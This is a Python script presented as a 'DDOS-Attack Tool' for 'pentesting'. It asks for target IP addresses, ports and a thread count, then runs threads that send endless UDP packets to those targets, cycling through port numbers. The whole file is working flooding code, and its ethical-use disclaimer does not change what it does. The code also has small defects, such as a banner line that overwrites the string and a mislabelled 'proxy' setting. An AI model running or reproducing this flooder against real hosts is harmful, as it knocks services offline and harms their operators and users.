import os
import time
import socket
import scapy.all as scapy
import random
import threading


def display_banner():
    banner =  "#####    ##  ##\n"
    banner += "##  ##   ##  ##\n"
    banner += "##  ##   ##  ##\n"
    banner += "#####     ####\n"
    banner += "##         ##\n"
    banner += "##         ##\n"
    banner =  "##         ##\n"
    banner += "######    ####    #####    #####    ######   ##  ##   ######\n"
    banner += "  ##     ##  ##   ##  ##   ##  ##   ##       ### ##     ##\n"
    banner += "  ##     ##  ##   ##  ##   ##  ##   ##       ######     ##\n"
    banner += "  ##     ##  ##   #####    #####    ####     ######     ##\n"
    banner += "  ##     ##  ##   ####     ####     ##       ## ###     ##\n"
    banner += "  ##     ##  ##   ## ##    ## ##    ##       ##  ##     ##\n"
    banner += "  ##      ####    ##  ##   ##  ##   ######   ##  ##     ##\n"
    print(banner)


display_banner()


os.system('color 0A')
print("Developer   :Joel Greyhat(https://www.joelgreyhatportfolio.com.ng)")
print('Tool Type     :DDOS-Attack Tool')
print('Function     :A simple ddos tool for pentesting reasons.')
print('Disclaimer     :This programm should be used only for ethical reasons. I am not respnsible for any misuse.')
print()


mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65535:
                port = 1

# input an ip address and a port number
ips = input("IP Address (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_amount = int(input("Proxy Amount : "))
threads = int(input("Number of threads : "))

# attack is being initiated
print("Attack is being initiated.")

time.sleep(4)
for ip in ips:
    for port in ports:
        data = b'You are launching a ddos attack'
        print("Attack started on ", ip, " at port ", port, " with a proxy amount of ", proxy_amount, "...")
        for r in range(threads):
            s = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_amount))
            s.start()           

if os.name == "nt": 
    os.system("cls")
else: 
    os.system("clear")
input("Hit Enter to quit...")
# Written by Joel Greyhat 
#PyTorrent V1.0

